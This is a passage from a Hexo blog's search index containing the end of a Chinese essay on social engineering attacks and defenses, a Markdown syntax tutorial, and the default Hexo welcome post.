Based）</h3><p>与基于人类线下交往的社工手段相反，这是一种依附于网络空间的社会工程学手段。在此类中，我们只需在虚拟空间布好陷阱来接触到目标信息。这里同样列举几种常见的方法：</p><p>(1)网络钓鱼<br>可以采取多种形式轻易地获取个人信息或凭证。可能是在诱使用户在看起来合法的网站上输入个人凭证，用户名密码等等，该网站会将信息反馈给攻击者。</p><p>(2).水坑攻击<br>一旦攻击者确定了受害者的个人资料，水坑攻击便试图在该人或组织经常访问的网站上进行攻击。这种利用访问会将恶意软件植入到他们的计算机中，例如远程访问木马，从而使攻击者可以开始窃取数据的工作。</p><p>(3)信任攻击<br>攻击者将向受害者提供真正有价值的东西，并以蠕虫的方式侵入目标网络。举个例子，攻击者冒充技术支持人员，帮助你解决了遇到的问题，但同时也说服你输入一行代码（后门）。简而言之，这种攻击很简单，就像提供一块巧克力来换取你的密码。</p><p>(4)诱饵攻击<br>在这里，攻击者通常是通过激发好奇心或说服你运行带有隐藏恶意软件的硬件或软件来诱使受害者执行代码。例如，在办公楼下分发的看上去无辜的U盘，实际上可能包含恶意木马；或者是在人多的地方，故意掉落一些USB接口的硬件等等。</p><p>(5)好感攻击<br>就是指攻击者创造了一个合理的场景，他们诱骗受害者一起玩耍以窃取其信息。比如，攻击者先和你成为朋友，获取你的一些基本信息，然后伪装成你办理业务的银行，骗取受害者钱财。它依赖于与受害者建立虚假的友谊，而受害者无论出于何种原因都会给攻击者带来更多的信息，攻击者再基于信息进行攻击。</p><p>(6)伪身份攻击<br>本质上是将经过高级身份验证的人员跟踪到限制区域内，使用伪装之类的欺骗手段使受害者获得虚假的安全感。举个例子，在现实生活中，你穿着一身电信的工作人员的衣服，提个工具包，可以借此进出保安系统相当完备的企业大楼，如果要求出示证件，伪造一张类似的，并在进出表上填写虚假个人信息。</p><h1 id="2社会工程防范措施"><a href="#2社会工程防范措施" class="headerlink" title="2社会工程防范措施"></a>2社会工程防范措施</h1><p>人性千变万化，而与之相对应的社会工程手段也自是纷繁复杂。尤其随着信息安全技术的不断发展，攻击手段也将也来越多样化，防御手段不可能只是墨守成规，固步自封。</p><p>经由对社会工程学攻击展开对比分析，我们知道社会工程学手段大体包含两个不同的方面：一个是科学技术维度，另一个是人为心理维度。而预防与检测社会工程学攻击，其效果同样和维护操作系统安全的效果同样明显，所以防范策略需要在物理和心理两个层面上都有所动作。我们为维护操作系统安全则需要做到两方面同时部署，一个是从安全技术策略角度，一个是从系统相关管理人员角度。</p><p>安全技术策略需要在物理、网络、操作系统、数据库、中间件等多方面进行设置。但同时也要通过系统管理制度等方面对管理系统的相关人员进行培训，提高信息安全意识，站在网络系统管理员的立场上，尽量不要让“人之间的关系”因素问题介入你的信息安全链路之中。培训用户学习安全策略规定并确保他们遵守，是防范社会工程学攻击的主要办法。为了对付社会工程攻击，要抛弃网络架构刀枪不入之类的幻想，是防范社会工程学攻击的必要保证。</p><p>下面是对防御社会工程学制定的两类策略：</p><p>第一类，对企业而言：</p><p>（1）我们首先应建立事故响应小组。而这应当由来自公司不同关键部门的知识渊博的员工组成，他们要经过良好培训并随时准备对社会工程攻击做出反应，有效地分析出入侵的目的与方式。</p><p>（2）其次，要将规章制度的设立与教育培训相结合。对企业内部进行培训，建立雇员参与机制，制定简单的规则，确定什么是关键信息，提高员工的安全意识。</p><p>（3）再次，要筹备尽可能完善的网络安全管理策略。策略中确定对每个资源管理授权者的同时，还要确定他们可以对用户授予哪些级别的权限。倘若缺少资源管理授权者的信息，就无法掌握究竟哪些人在使用网络。对于主干网络中的关键通信资源，对其可授权范围应尽可能小，范围越小就越容易管理，相对也就越安全，以防止对授权职责的滥用。</p><p>（4）最后，则建立相应预警演练机制。模拟入侵程序，利用模拟环境和测试，来制定相应的对策和解决方法。同时全面应用其他安全技术措施，譬如设立电话录音、客户访问记录、文档等敏感信息的访问等级制度。</p><p>第二类，对个人用户而言：</p><p>（1）当心来路不明的服务提供商发来的电子邮件、即时消息以及电话。在提供任何个人信息前验证其身份的真实性和请求的合法性；</p><p>（2）缓慢并认真地浏览电子邮件、即时消息或短信中的细节。不要让攻击者消息中的急迫性响了判断力；</p><p>（3）信息是预防社会工程攻击的最有力的工具，积极了解如何鉴别和防御网络攻击者；永远要点击来自陌生发送者的电子邮件中的嵌入链接。如果有必要就使用搜索引擎寻找网站或工输入网址；</p><p>（4）永远不要在未知发送者的电子邮件中下载附件，如果有必要，可以在保护视图中打开附拒绝来自陌生人的在线电脑技术帮忙，无论他们声称自己是多么正当；</p><p>（5）使用防火墙来保护计算机设备，及时更新杀毒软件同时启用和设置垃圾邮件过滤；</p><p>（6）保持操作系统和应用软件的更新，及时安装软件供应商发布的安全补丁程序；</p><p>（7）关注网站的链接，有的不法分子对网络链接做了细微的改动，将流量诱导到诈骗等不良网站。<br>。</p><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h1><p>网络安全涉及问题极其广泛，入侵攻击手段纷繁复杂，它不仅只是技术问题，而是与社会心理学息息相关。因为并不是所有的服务都是可以凭借单纯的技术手段去入侵的。社会工程学攻击已将黑客技术从大众所认为的单纯的技术问题发展成为了防不胜防的社会学问题，而这社会因素甚至更为重要。</p><p>“习惯”是非常可怕的。一些“后门”常常是出于人的惯性行为，疏忽，制度的不规范、不严密，导致其成为了黑客突破的对象。仔细分析，我们会发现，从社会工程学延伸出以其为首要经典攻击手法，如网络钓鱼、密码心理学以及一些利用社会工程学渗入目标企业或者内部得到所需要信息的大胆手法，皆是利用人性弱点进行攻击的方法。综上所述，重视对安全意识的培养，强化对安全技术的管理，加强对安全审核的策略，建立及时而完备的响应机制，同时注重对个人隐私的保护，才是保障网络信息安全，防范社会工程学攻击的不二法门。</p><p>教育与培训应该成为社会、企业的一个常态化工作。对网络信息安全的培训，同样要加入对社会工程学的课程，借助社会各个资源进行宣传和引导，它不应该成为政法部门专属的宣传工作一一借助媒体、学校、社区工作者都可以成为教育与培训的辅助力量。从而减少个体用户被施以社工渗透的机会，也有助于其他相关方面工作的开展。虽然近些年来，随着信息科技的发展和人们防范意识的增强，对社工渗透有了一定的抵御能力，然而很多人在日常生活中的安全防范意识仍是很薄弱的，只有通过培训和宣传增加对社会工程学知识的了解，强化安全防范意识，使人们培养良好的理性分析习惯，才不会成为下一个被“欺骗的艺术”愚弄的对象。</p><pre><code>参考文献：[1] 肖新光.寻找APT的关键词[J].中国信息安全,2013(10):100-104[2] 张瑜,潘小明,LIU Qingzhong,曹均阔,罗自强.APT攻击与防御[J].清华大学学报：自然科学版,2017,57(11):1127-1133[3] 王治,范明钰,王光卫.信息安全领域中的社会工程学研究[J].信息安全与通信保密,2005(7):229-231 [4] 闫兵.信息安全中的社会工程学攻击研究[J].办公自动化：综合月刊,2008(10):40-4147[5] 薛晨,杨世平.基于社会工程学的入侵渗透的研究[J].贵州大学学报：自然科学版,2015,32(1):81-85[6] 任利宁.浅析社会工程学入侵网络的机制与防范措施[J].兰州工业高等专科学校学报,2009,16(2):7-9</code></pre>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 社会工程学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MarkDown语法(一)</title>
      <link href="/post/730dd3ed.html"/>
      <url>/post/730dd3ed.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>本文是我初次搭建博客所写，也是首次接触markdown语言，故著博客，是为学习积累。</p><p>版权声明：本文为CSDN博主「witnessai1」的原创文章，原文链接：<a href="https://blog.csdn.net/witnessai1/article/details/52551362">https://blog.csdn.net/witnessai1/article/details/52551362</a></p></blockquote><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><pre><code>0.目录1.斜体和粗体2.分级标题3.超链接    3.1行内式    3.2参考式    3.3自动连接4.锚点5.列表    5.1无序列表    5.2有序列表    5.3定义型列表    5.4列表缩进    5.5包含段落的列表    5.6包含引用的列表    5.7包含代码区块的引用    5.8一个特殊情况</code></pre><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="斜体和粗体"><a href="#斜体和粗体" class="headerlink" title="斜体和粗体"></a>斜体和粗体</h2><p>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="emphasis">*斜体*</span>或<span class="emphasis">_斜体_</span></span><br><span class="line"><span class="strong">**粗体**</span></span><br><span class="line"><span class="strong">**<span class="emphasis">*加粗斜体*</span>**</span></span><br><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure><p>显示效果</p><p><em>斜体</em><br><strong>粗体</strong><br><em><strong>加粗斜体</strong></em><br><del>删除线</del></p><h2 id="分级标题"><a href="#分级标题" class="headerlink" title="分级标题"></a>分级标题</h2><p>第一种写法：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">    这是一个一级标题</span></span><br><span class="line"><span class="section">============================</span></span><br><span class="line"><span class="section">    这是一个二级标题</span></span><br><span class="line"><span class="section">----------------------------</span></span><br></pre></td></tr></table></figure><p>第二种写法：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 一级标题</span></span><br><span class="line"><span class="section">## 二级标题</span></span><br><span class="line"><span class="section">### 三级标题</span></span><br><span class="line"><span class="section">#### 四级标题</span></span><br><span class="line"><span class="section">##### 五级标题</span></span><br><span class="line"><span class="section">###### 六级标题</span></span><br></pre></td></tr></table></figure><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><p>Markdown 支持两种形式的链接语法： 行内式和参考式两种形式，行内式一般使用较多</p><h3 id="行内式"><a href="#行内式" class="headerlink" title="行内式"></a>行内式</h3><p>语法说明：</p><p>[]里写链接文字，()里写链接地址, ()中的”“中可以为链接指定title属性，title属性可加可不加。title属性的效果是鼠标悬停在链接上会出现指定的 title文字。[链接文字](链接地址 “链接标题”)’这样的形式。链接地址与链接标题前有一个空格。</p><p>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">欢迎来到[<span class="string">冷小宸的博客</span>](<span class="link">https://02lxc.github.io/ &quot;Enboy_Yu&#x27;s Blog&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="参考式"><a href="#参考式" class="headerlink" title="参考式"></a>参考式</h3><p>参考式超链接一般用在学术论文上面，或者另一种情况，如果某一个链接在文章中多处使用，那么使用引用 的方式创建链接将非常好，它可以让你对链接进行统一的管理。</p><p>语法说明：<br>参考式链接分为两部分，文中的写法 [链接文字][链接标记]，在文本的任意位置添加[链接标记]:链接地址 “链接标题”，链接地址与链接标题前有一个空格。</p><p>如果链接文字本身可以做为链接标记，你也可以写成[链接文字][]<br>[链接文字]：链接地址的形式，见代码的最后一行。</p><p>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   我经常去的几个网站[<span class="string">Google</span>][<span class="symbol">1</span>]、[<span class="string">Leanote</span>][<span class="symbol">2</span>]以及[<span class="string">自己的博客</span>][<span class="symbol">3</span>]</span><br><span class="line">[<span class="string">Leanote 笔记</span>][<span class="symbol">2</span>]是一个不错的[<span class="string">网站</span>][<span class="symbol"></span>]。</span><br><span class="line"></span><br><span class="line">————————————————</span><br><span class="line">[<span class="symbol">1</span>]:<span class="link">http://www.google.com &quot;Google&quot;</span></span><br><span class="line">[<span class="symbol">2</span>]:<span class="link">http://www.leanote.com &quot;Leanote&quot;</span></span><br><span class="line">[<span class="symbol">3</span>]:<span class="link">http://http://blog.leanote.com/freewalk &quot;梵居闹市&quot;</span></span><br><span class="line">[<span class="symbol">网站</span>]:<span class="link">http://http://blog.leanote.com/freewalk</span></span><br></pre></td></tr></table></figure><h3 id="自动链接"><a href="#自动链接" class="headerlink" title="自动链接"></a>自动链接</h3><p>语法说明：<br>Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用&lt;&gt;包起来， Markdown 就会自动把它转成链接。一般网址的链接文字就和链接地址一样，例如：</p><p>代码：</p> <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">&lt;http://example.com/&gt;</span></span><br><span class="line"><span class="language-xml">&lt;address@example.com&gt;</span></span><br></pre></td></tr></table></figure><h2 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h2><p>网页中，锚点其实就是页内超链接，也就是链接本文档内部的某些元素，实现当前页面中的跳转。比如我这里写下一个锚点，点击回到目录，就能跳转到目录。 在目录中点击这一节，就能跳过来。还有下一节的注脚。这些根本上都是用锚点来实现的。</p><p>注意： </p><p>1.Markdown Extra 只支持在标题后插入锚点，其它地方无效。</p><p>2.Leanote 编辑器右侧显示效果区域暂时不支持锚点跳转，所以点来点去发现没有跳转不必惊慌，但是你发布成笔记或博文后是支持跳转的。</p><p>代码:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跳转到[<span class="string">目录</span>](<span class="link">#index</span>)</span><br></pre></td></tr></table></figure><p>显示效果：<br>跳转到<a href="#index">目录</a></p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>使用 *，+，- 表示无序列表。</p><p>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> 无序列表项 一</span><br><span class="line"><span class="bullet">*</span> 无序列表项 二</span><br><span class="line"><span class="bullet">*</span> 无序列表项 三</span><br></pre></td></tr></table></figure><p>显示效果：</p><pre><code>* 无序列表项 一* 无序列表项 二* 无序列表项 三</code></pre><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>有序列表则使用数字接着一个英文句点。</p><p>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 有序列表项 三</span><br><span class="line"><span class="bullet">2.</span> 有序列表项 三</span><br><span class="line"><span class="bullet">3.</span> 有序列表项 三</span><br></pre></td></tr></table></figure><p>显示效果：</p><p>1.有序列表项 一</p><p>2.有序列表项 二</p><p>3.有序列表项 三</p><h3 id="定义型列表"><a href="#定义型列表" class="headerlink" title="定义型列表"></a>定义型列表</h3><p>语法说明：<br>定义型列表由名词和解释组成。一行写上定义，紧跟一行写上解释。解释的写法:紧跟一个缩进(Tab)</p><p>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Markdown</span><br><span class="line">:    轻量级文本标记语言，可以转换成html，pdf等格式（左侧有一个可见的冒号和四个不可见的空格）</span><br><span class="line">代码块 2</span><br><span class="line">:   这是代码块的定义（左侧有一个可见的冒号和四个不可见的空格）</span><br><span class="line"><span class="code">        代码块（左侧有八个不可见的空格）</span></span><br></pre></td></tr></table></figure><p>显示效果：</p><p>Markdown</p><p>:    轻量级文本标记语言，可以转换成html，pdf等格式</p><p>代码块 2</p><p>:   这是代码块的定义</p><pre><code>    代码块</code></pre><h3 id="列表缩进"><a href="#列表缩进" class="headerlink" title="列表缩进"></a>列表缩进</h3><p>语法说明：</p><p>列表项目标记通常是放在最左边，但是其实也可以缩进，最多 3 个空格，项目标记后面则一定要接着至少一个空格或制表符。</p><p>要让列表看起来更漂亮，你可以把内容用固定的缩进整理好（显示效果与代码一致）：</p><pre><code>轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。 那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。 软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹似的梦。 寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。 但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！ 悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</code></pre><p>但是如果你懒，那也行：</p><p>代码： </p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span>   轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。</span><br><span class="line">那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。 </span><br><span class="line">软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！ </span><br><span class="line"><span class="bullet">*</span>   那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹似的梦。 </span><br><span class="line">寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。 </span><br><span class="line">但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！ </span><br><span class="line">悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</span><br></pre></td></tr></table></figure><p>显示效果：</p><ul><li>轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。<br>那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。<br>软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！ </li><li>那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹似的梦。<br>寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。<br>但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！<br>悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</li></ul><h3 id="包含段落的列表"><a href="#包含段落的列表" class="headerlink" title="包含段落的列表"></a>包含段落的列表</h3><p>语法说明：</p><p>列表项目可以包含多个段落，每个项目下的段落都必须缩进 4 个空格或是 1 个制表符（显示效果与代码一致）：</p><p>轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。<br>那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。<br>软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！</p><p>那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹似的梦。<br>寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。<br>但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！</p><p>悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</p><p>如果你每行都有缩进，看起来会看好很多，当然，再次地，如果你很懒惰，Markdown 也允许：</p><p>代码：</p><pre><code>    *   轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。    那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。     软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！        那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹梦。     寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。     但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！    *    悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</code></pre><p>显示效果：</p><ul><li>轻轻的我走了， 正如我轻轻的来； 我轻轻的招手， 作别西天的云彩。<br>那河畔的金柳， 是夕阳中的新娘； 波光里的艳影， 在我的心头荡漾。<br>软泥上的青荇， 油油的在水底招摇； 在康河的柔波里， 我甘心做一条水草！<br>那榆荫下的一潭， 不是清泉， 是天上虹； 揉碎在浮藻间， 沉淀着彩虹梦。</li></ul><p>寻梦？撑一支长篙， 向青草更青处漫溯； 满载一船星辉， 在星辉斑斓里放歌。<br>但我不能放歌， 悄悄是别离的笙箫； 夏虫也为我沉默， 沉默是今晚的康桥！</p><ul><li>悄悄的我走了， 正如我悄悄的来； 我挥一挥衣袖， 不带走一片云彩。</li></ul><h3 id="包含引用的列表"><a href="#包含引用的列表" class="headerlink" title="包含引用的列表"></a>包含引用的列表</h3><p>语法说明：</p><p>如果要在列表项目内放进引用，那 &gt; 就需要缩进：<br>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span>   阅读的方法:</span><br><span class="line"></span><br><span class="line"><span class="code">    &gt; 打开书本。</span></span><br><span class="line"><span class="code">    &gt; 打开电灯。</span></span><br></pre></td></tr></table></figure><p>显示效果：</p><ul><li><p>阅读的方法:</p><blockquote><p>打开书本。<br>打开电灯。</p></blockquote></li></ul><h3 id="包含代码区块的引用"><a href="#包含代码区块的引用" class="headerlink" title="包含代码区块的引用"></a>包含代码区块的引用</h3><p>语法说明：<br>如果要放代码区块的话，该区块就需要缩进两次，也就是 8 个空格或是 2 个制表符：</p><p>一列表项包含一个列表区块：</p><pre><code>    &lt;代码写在这&gt;</code></pre><h3 id="一个特殊情况"><a href="#一个特殊情况" class="headerlink" title="一个特殊情况"></a>一个特殊情况</h3><p>在特殊情况下，项目列表很可能会不小心产生，像是下面这样的写法：</p><pre><code>    1986. What a great season.</code></pre><p>会显示成：</p><p>What a great season.</p><p> 换句话说，也就是在行首出现数字-句点-空白，要避免这样的状况，你可以在句点前面加上反斜杠：</p><pre><code>    1986\. What a great season.</code></pre><p>会显示成：</p><p>1986. What a great season.</p>]]></content>
      
      
      <categories>
          
          <category> MarkDown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MarkDown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/post/4a17b156.html"/>
      <url>/post/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
